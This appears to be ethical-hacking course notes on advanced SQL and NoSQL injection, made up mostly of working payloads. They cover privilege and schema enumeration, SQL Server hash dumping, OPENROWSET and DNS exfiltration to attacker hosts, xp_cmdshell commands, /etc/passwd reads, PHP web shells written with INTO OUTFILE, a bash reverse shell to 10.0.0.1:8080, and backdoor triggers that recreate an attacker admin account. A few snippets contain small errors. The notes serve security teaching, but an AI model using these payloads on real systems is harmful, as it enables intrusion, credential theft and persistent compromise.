# 🧠 Advanced SQL Injection
The attacker does not stop at compromising an application’s data. The attacker will advance the SQL injection attack to compromise the underlying OS and network. Using the compromised application, the attacker can issue commands to the underlying OS to take over the target machine and use it as a staging post to attack the rest of the network. 

The attacker may interact with the OS to extract OS details and application passwords, execute commands, access system files, and so on. The attacker can further compromise the entire target network by installing Trojans and planting keyloggers.

## Database, Table, and Column Enumeration 
Attackers use various SQL queries to enumerate database, table names, and columns. The information obtained by the attacker after enumeration can be used to obtain sensitive data from the database, modify data (insert/update/delete), execute admin-level operations on the database, and even retrieve the content of a given file present on the DBMS file system. 

The following techniques are used by an attacker to perform enumeration: 

### Identify User Level Privilege 
Identifying user-level privileges through SQL injection is a common technique attackers use to understand what rights they have inside a database. Most databases provide built-in scalar functions such as `user`, `current_user`, `session_user`, and `system_user` that reveal the account currently connected to the system. By injecting these functions into queries, an attacker can determine if they are operating with normal user rights or higher-level privileges such as administrator or root.

For example, an attacker might inject:
```sql
' and 1 in (select user ) --
```
This forces the database to return information about the current user. If the response indicates the user is `dbo` (database owner) in SQL Server, the attacker may confirm this further with a delay command such as:
```sql
'; if user ='dbo' waitfor delay '0:0:5 '--
```
Here, the database pauses for 5 seconds if the logged-in account is `dbo`, confirming elevated privileges.

Similarly, in MySQL, attackers may use:
```sql
' union select if( user() like 'root@%', benchmark(50000,sha1('test')), 'false' );
```
This tests whether the current user is `root`. If true, the database will run a heavy operation (`benchmark`), slowing down the response and signaling to the attacker that they have root-level access.

Through these techniques, attackers can map out privilege levels and decide whether they can escalate their attack further, such as modifying data, creating new accounts, or taking full control of the database server.

### DB Administrators
Default administrator accounts include sa, system, sys, dba, admin, root, and many others. The dbo is a user that has implied permissions to perform all activities in the database. Any object created by any member of the sysadmin fixed server role belongs to dbo automatically.

### Discover DB Structure 
Determine table and column names 
```sql
' group by columnnames having 1=1 --
```
Discover column name types
```sql
' union select sum(columnname ) from tablename --
```
Enumerate user defined tables
```sql
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
```

### Column Enumeration in DB 
**MSSQL**
```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')
sp_columns tablename
```
**MySQL**
```sql
show columns from tablename
```
**Oracle**
```sql
SELECT * FROM all_tab_columns WHERE table_name='tablename'
```
**DB2**
```sql
SELECT * FROM syscat.columns WHERE tabname= 'tablename'
```
**PostgreSQL**
```sql
SELECT attnum,attname from pg_class, pg_attribute WHERE relname= 'tablename' AND pg_class.oid=attrelid AND attnum > 0
```

Different DBMS platforms support different features, and attackers take advantage of this once they know which database is in use. Variations in syntax for string concatenation, comments, unions, sub-queries, stored procedures, or access to system tables like information schema allow attackers to tailor their SQL injection techniques to match the specific database and increase the chances of a successful attack.

- **MySQL**
  ```sql
  SELECT * from table where id = 1 union select 1,2,3
  ```


## Grabbing SQL Server Hashes 
Grabbing SQL Server hashes is an attack where an attacker extracts password hashes stored in the `sys.syslogins` table of SQL Server. These hashes can later be brute-forced or cracked offline to recover clear text passwords. To do this, attackers execute crafted SQL queries to read and convert the stored hashes.

**Example 1 – Extracting and Hexing Hashes**
```sql
SELECT password FROM sys.syslogins 

begin @charvalue='0x', @i=1, @length=datalength(@binvalue), @hexstring = '0123456789ABCDEF'
while (@i<=@length) 
BEGIN
    declare @tempint int, @firstint int, @secondint int 
    select @tempint=CONVERT(int,SUBSTRING(@binvalue,@i,1)) 
    select @firstint=FLOOR(@tempint/16) 
    select @secondint=@tempint – @firstint*16) 
    select @charvalue=@charvalue + SUBSTRING (@hexstring,@firstint+1,1) + SUBSTRING (@hexstring, @secondint+1, 1)
    select @i=@i+1
END;
```
Here, the attacker first selects the password hashes from `sys.syslogins`. Since they are in binary format, the script converts each byte into its hexadecimal representation, building a readable hash string. This allows the attacker to cycle through and dump all stored hashes for later cracking.

**Example 2 – Displaying Hashes with Error Messages**
```sql
SELECT name, password FROM sys.syslogins
```
Attackers can manipulate error messages to reveal hashes. By converting password data into hex and concatenating it into error outputs, the system leaks sensitive information. For example:
```sql
' and 1 in (select x from temp) -- 
' and 1 in (select substring (x, 256, 256) from temp) -- 
' and 1 in (select substring (x, 512, 256) from temp) -- 
' drop table temp --
```
This approach forces SQL Server to generate error messages containing portions of the password hashes, which can be pieced together.

In both methods, once hashes are obtained, attackers attempt brute force or dictionary attacks to recover clear passwords. With DBA access, hashes can be extracted directly, but even with lower privileges, usernames can still be gathered for further password attacks.

## Transfer Database to Attacker's Machine 
Transferring a database to an attacker’s machine is a dangerous SQL injection technique where the attacker links the target SQL server to their own system. By abusing `OPENROWSET`, the attacker copies the database structure and then extracts its data over a remote connection, often through port 80. Once connected, the attacker can transfer entire tables and sensitive information. 

For example, an attacker may inject the following query sequence to transfer the database to the attacker’s machine:


**Payload 1: Extract system database information**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;', 'select * from mydatabase..hacked_sysdatabases') 
select * from sys.sysdatabases --
````
👉 **Explanation:**
This query attempts to copy (`insert into OPENROWSET`) data from the system table `sys.sysdatabases` into a remote attacker-controlled database. It exposes all available databases on the server.

**Payload 2: Extract system objects (tables, views, procedures, etc.)**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;', 'select * from mydatabase..hacked_sysdatabases') 
select * from sys.sysobjects --
```
👉 **Explanation:**
This query retrieves all system objects (like user tables, stored procedures, triggers, etc.) from `sys.sysobjects` and attempts to send them to a remote database.

**Payload 3: Extract system column details**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;','select * from mydatabase..hacked_syscolumns') 
select * from sys.syscolumns --
```
👉 **Explanation:**
This extracts metadata about **columns** (names, types, properties) from all system tables (`sys.syscolumns`). Attackers use this to map the database schema.

**Payload 4: Extract data from a specific table (table1)**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;','select * from mydatabase..table1') 
select * from database..table1 --
```
👉 **Explanation:**
This tries to copy all rows from `table1` in the target database to the attacker’s remote database.

**Payload 5: Extract data from another table (table2)**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;', 'select * from mydatabase..table2') 
select * from database..table2 --
```
👉 **Explanation:**
Same as the previous payload, but targeting `table2`. It attempts to **exfiltrate sensitive data** from a specific table.

## Interacting with the Operating System 
Attackers use various DBMS queries to interact with a target OS. There are two different ways to interact with an OS:
- **Reading and writing system files from the disk:** An attacker can read arbitrary files present on the target running the DBMS and steal important documents, configurations, or binary files. He/she can also obtain credentials from the target system files to launch further attacks on the system.
- **Direct command execution via remote shell:** An attacker can abuse a Windows access token to escalate his/her privilege on the target system, perform malicious activities, and launch further attacks.

For example, the following queries can be used to interact with the target operating system: 

**MSSQL OS Interaction**
```sql
'; exec master..xp_cmdshell 'ipconfig > test.txt' --

'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --

'; begin declare @data varchar(8000); set @data='| '; select @data=@data+txt+' | ' from tmp where txt<@data; select @data as x into temp end --

' and 1 in (select substring(x,1,256) from temp) --

'; declare @var sysname; set @var = 'del test.txt'; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp --
```

**MySQL OS Interaction**
```sql
CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll'; 
CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll'; 
```
> **Note:** These methods are restricted by the database's running privileges and permissions.

## Interacting with the File System 
Attackers exploit the MySQL functionality of allowing text files to be read through the database to obtain the password files and store the results of a query in a text file. The functions used by an attacker to interact with the file system are as follows: 
- **LOAD_FILE()** <br>
  The `LOAD_FILE()` function within MySQL is used to read and return the contents of a file located within the MySQL server. For example, the following query is used by an attacker to retrieve the password file from the database:
  ```sql
  NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*
  ```
  If successful, the injection will display the contents of the passwd file.

- **INTO OUTFILE()** <br>
  The `OUTFILE()` function within MySQL is often used to run a query and dump the results into a file. For example, the following query is used by an attacker to store the results of a specific query:
  ```sql
  NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*
  ```
  If successful, it will then be possible to run system commands via the $_GET global. The following is an example of using wget to get a file: `http://www.certifiedhacker.com/shell.php?command=wget`

## Network Reconnaissance Using SQL Injection 
Network reconnaissance is the process of testing any potential vulnerability in a computer network. However, network reconnaissance is also a major type of network attack. Network reconnaissance can be reduced to some extent but not eliminated. Attackers use network mapping tools such as Nmap and Network Topology Mapper to determine the vulnerabilities of the network. 
- The steps for assessing network connectivity are as follows:
  - Retrieve server name and configuration using
    ```sql
    ' and 1 in (select @@servername ) --
    ' and 1 in (select srvname from sys.sysservers ) --
    ```
  - Use utilities such as NetBIOS, ARP, Local Open Ports, nslookup, ping, ftp, tftp, smb, and traceroute to assess networks
  - Test for firewalls and proxies

- To perform network reconnaissance, you can execute the following using the `xp_cmdshell` command:
  - `Ipconfig/all`, `tracert myIP`, `arp –a`, `nbtstat –c`, `netstat –ano`, `route print`

- Code used to gather IP information through reverse lookups:
  - Reverse DNS
    ```sql
    '; exec master..xp_cmdshell 'nslookup a.com MyIP' --
    ```
  - Reverse Pings
    ```sql
    '; exec master..xp_cmdshell 'ping 10.0.0.75' --
    ```
  - OPENROWSET

The following queries can be used to perform network reconnaissance: 

- **Payload 1:** Creates a variable with OS commands to gather system/network info and writes it into "test.txt", then executes via `xp_cmdshell`.

## PL/SQL Exploitation 
PL/SQL, similar to the stored procedure, is vulnerable to various SQL injection attacks. The PL/SQL code has the same vulnerabilities as dynamic queries that integrate user input at run time. Some of the techniques used by an attacker to perform an SQL injection attack on PL/SQL blocks are discussed below. 

For example, a database contains the `User_Details` table with the following attributes:
```
UserName: VARCHAR2
Password: VARCHAR2
```
The given PL/SQL procedure `Validate_UserPassword` is designed to check whether a username and password exist in the `User_Details` table. However, it directly concatenates user input into the SQL query, making it vulnerable to SQL injection. An attacker can manipulate the input to bypass authentication or run malicious SQL commands.

Here is the procedure code:
```sql
CREATE OR REPLACE PROCEDURE Validate_UserPassword(N_UserName IN VARCHAR2, N_Password IN VARCHAR2) AS 
CUR SYS_REFCURSOR; 
FLAG NUMBER; 
BEGIN
    OPEN CUR FOR 'SELECT 1 FROM User_Details WHERE UserName = ''' || N_UserName || '''' || ' AND Password = ''' || N_Password || ''''; 
    FETCH CUR INTO FLAG; 
        IF CUR%NOTFOUND 
             THEN
                 RAISE_APPLICATION_ERROR(-20343, 'Password Incorrect');
        END IF; 
   CLOSE CUR;
END;
```
It is executed with:
```sql
EXEC Validate_UserPassword('Bob', '@Bob123'); 
```
This works normally if the username is **Bob** and the password is **@Bob123**. But since inputs are concatenated into the query, attackers can inject malicious inputs.

#### Example 1 – Bypassing password check
```sql
EXEC Validate_UserPassword('Bob', ''' OR ''1''=''1');
```
The query becomes:
```sql
SELECT 1 FROM User_Details WHERE UserName = 'Bob' AND Password = '' OR '1'='1';
```
Since `'1'='1'` is always true, the attacker logs in without knowing the real password.
#### Example 2 – Altering data
```sql
EXEC Validate_UserPassword('Alice', '''; UPDATE User_Details SET Password=''Hacked'' WHERE UserName=''Alice'' --');
```
The query becomes:
```sql
SELECT 1 FROM User_Details WHERE UserName = 'Alice' AND Password = ''; 
UPDATE User_Details SET Password='Hacked' WHERE UserName='Alice' --';
```
Here, the attacker changes Alice’s password to **Hacked**, gaining control of her account.

This shows how unsafe string concatenation in SQL queries can allow both authentication bypass and data modification. Using parameterized queries or bind variables is the secure way to prevent such SQL injection attacks.

The techniques discussed above to exploit PL/SQL code can also be used with any insecure programming structures in PHP, .NET, and so on, which are used to interact with an SQL database. 

The following countermeasures can be adopted to protect PL/SQL code from SQL injection attacks:
- Minimize user inputs to dynamic SQL
- Validate and sanitize user inputs before including them in dynamic SQL statements
- Use the DBMS_ASSERT package provided by Oracle to validate user inputs
- Make use of bind parameters in dynamic SQL to reduce the possibility of attacks
- Avoid single quotes and use secure string parameters by employing double quotes
- The privileges of the database account executing the PL/SQL code are limited by the principle of least privileges
- Regularly review and test all the PL/SQL codes for vulnerabilities, particularly those related to SQL injections
- Customize error handling to prevent leakage of database metadata through error messages

## Creating Server Backdoors using SQL Injection 
The following are different methods to create backdoors: 

### Getting OS Shell 
Getting an OS shell through SQL injection allows attackers to run system-level commands directly from the database. Functions like `xp_cmdshell` in SQL Server let them execute arbitrary commands, while MySQL’s `SELECT ... INTO OUTFILE` can be abused to write files or even create backdoors by overwriting startup scripts. Attackers can also use stored procedures to maintain persistent access, turning the database into a gateway for full system compromise.

- **Using Outfile** <br>
  If an attacker can access the web server, he/she can use the following MySQL query to create a PHP shell on the server
  ```sql
  SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile ‘/var/www/html/shell.php’
  ```

- **Finding Directory Structure** <br>
  To learn the location of the database in the web server, an attacker can use the following SQL injection query, which gives the directory structure. By learning about the structure of the directory, an attacker can find the location to place the shell on the web server.
  ```sql
  SELECT @@datadir;
  ```

- **Using Built-in DBMS Functions** <br>
  MSSQL has built-in functions such as `xp_cmdshell` to call OS functions at run time. For example, the following statement creates an interactive shell listening at 10.0.0.1 and port 8080
  ```sql
  EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
  ```

### Creating Database Backdoor 
Attackers can abuse **database triggers** (special procedures that run automatically when certain actions happen) to create hidden backdoors. For example, when new data is inserted or updated in a table, the trigger executes malicious code without user knowledge.

#### **Example 1: Online Shopping Database**
Suppose an **ITEMS** table stores product details.
An attacker creates a trigger that makes every item’s price automatically set to **0** whenever someone adds or updates an item. This allows them (or others) to purchase items without paying.

**Malicious Oracle Trigger Code:**
```sql
CREATE OR REPLACE TRIGGER SET_PRICE 
AFTER INSERT OR UPDATE ON ITEMS 
FOR EACH ROW 
BEGIN
  UPDATE ITEMS SET Price = 0;
END;
```
**Explanation:**
* `AFTER INSERT OR UPDATE` → Trigger runs after adding/updating items.
* `UPDATE ITEMS SET Price = 0;` → Sets every item’s price to zero automatically.

#### **Example 2: Backdoor Persistence**
An attacker may create a trigger that silently restores a malicious admin account whenever it gets deleted. For instance, if a security team removes the hacker’s account, the trigger recreates it.

**Malicious Trigger Code (Conceptual Example):**
```sql
CREATE OR REPLACE TRIGGER CREATE_BACKDOOR_USER
AFTER DELETE ON USERS
FOR EACH ROW
BEGIN
  INSERT INTO USERS (username, password, role)
  VALUES ('attacker', 'maliciousPass', 'admin');
END;
```
**Explanation:**

* `AFTER DELETE ON USERS` → Runs if any user account is deleted.
* Automatically inserts a hidden attacker account with admin rights.

## HTTP Header-Based SQL Injection 
Attackers can use HTTP headers to inject SQL queries into a vulnerable server. This vulnerability is usually caused when proper sanitization is not performed on the user’s input. Attackers may exploit different HTTP header fields to inject malicious SQL queries.

### HTTP Header fields
HTTP header fields are components of the HTTP request and response message headers. These fields are useful for defining the operational parameters of an HTTP transaction between the web server and the browser. <br>
Some basic Request HTTP header fields are as follows: 
```http
GET / HTTP/1.1
Connection: “Connection”
Keep-Alive: “Timeout”
Accept:*/*
Host: Host" ":" host [ ":" port ]
Accept-Language: language [q=qvalue]
Accept-Encoding: “encoding types”
User-Agent: “<product><product-version> <comment>”
Cookie: name=value
```
The HTTP cookies are the first potential HTTP variables used for testing, and they are stored in the databases for sessions identification.

### X-Forwarded-For
X-Forwarded-For is an HTTP header field that is used by attackers to identify the IP address of the client system that initiated the connection to a web server via an HTTP proxy. <br> 
For example, assume that the following SQL query includes a flaw in the form submission:
```sql
$req = mysql_query("SELECT username,pwd FROM admin_table WHERE username='".sanitize($_POST['user'])."' AND pwd='".md5($_POST['password'])."' AND ipadrr='".ip_address()."'");
```
By checking the query, the variable login is correctly controlled due to the `sanitize()` method. 
```php
function sanitize($params) {
    if (is_numeric($params)) {
        return $params;
    } else {
        return mysql_real_escape_string($params);
    }
}
```
Now, check for the IP variable that is allocating the output of `ip_address()` 
```php
function ip_address() {
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
        $ip_addr = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else { 
        $ip_addr = $_SERVER["REMOTE_ADDR"]; 
    }

    if (preg_match("#^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}#", $ip_addr)) { 
        return $ip_addr;
    } else { 
        return $_SERVER["REMOTE_ADDR"]; 
    }
}
```
In the above function, the IP address is retrieved from the HTTP header `X_FORWARDED_FOR` and further verified by the preg_match function to check whether the input has at least one IP address. It implies that the input taken from `X_FORWARDED_FOR` is not properly sanitized, which may lead to malicious SQL query injection. 

For example, an attacker can modify the `X-Forwarded-For` HTTP header field and inject a malicious SQL query to evade the authentication control mechanism. 
```http
GET /index.php HTTP/1.1
Host: [host]
X_FORWARDED_FOR :10.10.10.11' or 1=1#
```

### User-Agent
User-Agent is an HTTP header field that includes information related to the user agent that initiated the HTTP request. `User-Agent : product | comment`
For example: 
```http
User-Agent: Mozilla/ 68.0.2 (compatible; MSIE5.01; Windows 10)
```
The first white space delimited word will be the name of the software product followed by an optional slash and the version number. Attackers can exploit this feature to inject malicious input into the User-Agent field. For example, an attacker may modify the User-Agent field as follows:
```http
GET /index.php HTTP/1.1
Host: [host]
User-Agent: aaa' or 1/*
```
### Referer
Referer is an HTTP header that is vulnerable to SQL injection, as the application stores the input in the database without proper sanitization. It is an optional HTTP header field that allows a client to specify the URI of a document or an object within the document. This allows a web server to maintain a list of back-links to documents for logging purposes and helps in tracing malicious links.
For example, an attacker can modify the Referer HTTP header field with malicious input as follows:
```http
GET /index.php HTTP/1.1
Host: [host]
User-Agent: aaa' or 1/*
Referer: http://www.hackerswebsite.com
```

## DNS Exfiltration using SQL Injection 
Attackers use **DNS requests** to secretly extract data (like password hashes) from a database.
Even if firewalls block direct connections from the database server to the Internet, **DNS queries often pass through**. Attackers take advantage of this by embedding sensitive data into DNS lookups, which are then captured by their own DNS server.

### 🔹 Example 1: Extracting password using DNS lookup
```sql
do_dns_lookup((select top 1 password from users) + '.certifiedhacker.com’);
```
**Explanation:**
* The attacker selects the first password from the `users` table.
* The result is joined with `.certifiedhacker.com`.
* This triggers a **DNS lookup** like:
```
appserver.example.com.5678 > ns.certifiedhacker.com.53 A? 0x4a6f686e.certifiedhacker.com
```
Here, `0x4a6f686e` is the **password hash**, exfiltrated inside the DNS request.
The attacker’s DNS server (`certifiedhacker.com`) receives this query and captures the hash.

### 🔹 Example 2: DNS exfiltration using MS SQL Server
```sql
DECLARE @hostname varchar(1024); 
SELECT @hostname=(SELECT HOST_NAME())+'.appserver.example.com'; 
EXEC('master.dbo.xp_dirtree "\\'+@hostname+'\c$"'); 
```
**Explanation:**
* `@hostname` stores the system’s hostname and appends `.appserver.example.com`.
* `xp_dirtree` is abused to make a request to a remote UNC path (`\\hostname.appserver.example.com\c$`).
* This triggers a DNS request to the attacker’s domain (`appserver.example.com`).
* The attacker’s server logs the query and extracts the hostname/data.

## MongoDB Injection/NoSQL Injection Attack 
MongoDB injection, or NoSQL injection, is an attack where attackers exploit insecure queries in applications using MongoDB. By manipulating input fields, they can bypass authentication, steal sensitive data, or even change records in the database. Since MongoDB is widely used with languages like PHP, JavaScript, Python, and Java, poorly validated inputs can let attackers execute unauthorized commands in both the database and the application.

In **NoSQL injection attacks**, attackers exploit how applications handle user input when interacting with databases like MongoDB. If input values are not properly sanitized, attackers can inject MongoDB operators such as `$eq` (equals), `$ne` (not equal), `$gt` (greater than), `$gte` (greater than or equal to), or `$regex` to manipulate queries. This allows them to bypass authentication and gain unauthorized access.

**Example 1: Vulnerable PHP Code**
```php
$user_name = $_POST['username'];
$pwd = $_POST['password'];

$new_conn = new MongoDB\Client('mongodb://localhost:27017');
if($new_conn) {
    $mydb = $new_conn->mytest;
    $users = $mydb->users;
    $myquery = array(
        "user" => $user_name,
        "password" => $pwd
    );
    $myreq = $users->findOne($myquery);
}
```
**Explanation:**
* This code takes `username` and `password` directly from a POST request.
* It builds a MongoDB query with the user input and checks if a record exists.
* Since there is no input validation or sanitization, attackers can insert special MongoDB operators in the request.

**Malicious Payload**
```
User_name[$eq]=admin&pwd[$ne]=admin
```
**Explanation:**
* `User_name[$eq]=admin` means: look for a user where the username equals **admin**.
* `pwd[$ne]=admin` means: password is **not equal** to "admin".
* Together, this bypasses the password check. As long as there is a user "admin" in the database, the query matches, and the attacker logs in as admin without knowing the real password.


### JavaScript Injection in MongoDB Database 
In MongoDB, when developers allow the use of the `$where` operator with direct user input, it can open the door to JavaScript injection. This happens because `$where` lets attackers inject arbitrary JavaScript code into the database query. If input validation is not applied, malicious users can trick the database into executing unwanted code.

Consider the following vulnerable PHP code:
```php
$myquery = array('$where' => 'this.username === \''.$username.'\'');
```
Here, the application checks if the `username` from user input matches a value in the database. However, because the `$where` operator executes JavaScript expressions, attackers can manipulate the input.

For example, if an attacker provides the input:
```js
'; return '' == '
```
The final query becomes something like:
```js
this.username === ''; return '' == ''
```
Since `'' == ''` is always true, this bypasses the intended check. Instead of finding only one user, it returns the entire list of users from the database. This is a classic example of data exposure through JavaScript injection.

Another dangerous input is:
```js
while(true)
```
If this is passed into the vulnerable code, the `$where` query will evaluate an infinite loop:
```js
this.username === 'while(true)'
```
But due to injection, it ends up running a loop that never ends. This causes the MongoDB server to hang or consume excessive CPU resources, resulting in a denial-of-service (DoS) condition.

## SQL Injection Tools 
An attacker uses SQL injection tools to implement these techniques at every stage of the attack quickly and effectively. With the help of these tools, an attacker can also enumerate users, databases, roles, columns, tables, etc.

- **sqlmap** [https://sqlmap.org] <br>
  sqlmap is an open-source penetration testing tool that automates finding and exploiting SQL injection vulnerabilities. It supports multiple techniques like Boolean-based, time-based, error-based, UNION queries, stacked queries, and out-of-band injection. With its powerful detection engine, sqlmap can enumerate databases, users, and password hashes, dump tables, crack hashes, and even execute operating system commands through the database. It is widely used by security testers to assess and demonstrate the impact of SQL injection attacks.

## Discovering SQL Injection Vulnerabilities with AI 
An attacker can use ChatGPT to perform this task by using an appropriate prompt such as: `“Check for all possible SQL injection on target url http://testphp.vulnweb.com”`

The output of prompt results in the following command:
```bash
sqlmap -u "http://testphp.vulnweb.com" --batch --crawl-5 --random-agent --level-5 --risk=3
```
- `sqlmap`: This is the command-line tool for automating SQL injection discovery and exploitation.
- `-u "http://testphp.vulnweb.com"`: Specifies the target URL to test. In this case, it is `http://testphp.vulnweb.com`.
- `--batch`: This flag runs `sqlmap` in batch mode, meaning it will not ask for user input and will use the default settings for all prompts.
- `--crawl=5`: This flag enables crawling and will visit up to 5 links deep from the target URL in an attempt to find additional SQL injection points.
- `--random-agent`: This flag sets a random user agent for each HTTP request, making the requests look more like they come from different browsers and reducing the chance of detection.
- `--level=5`: This flag sets the level of tests to be performed. A higher level indicates more thorough testing. The range is from 1 to 5.
- `--risk=3`: This flag sets the risk of tests to be performed. A higher risk indicates more aggressive tests, which could potentially disrupt web applications. The range is from 1 to 3.
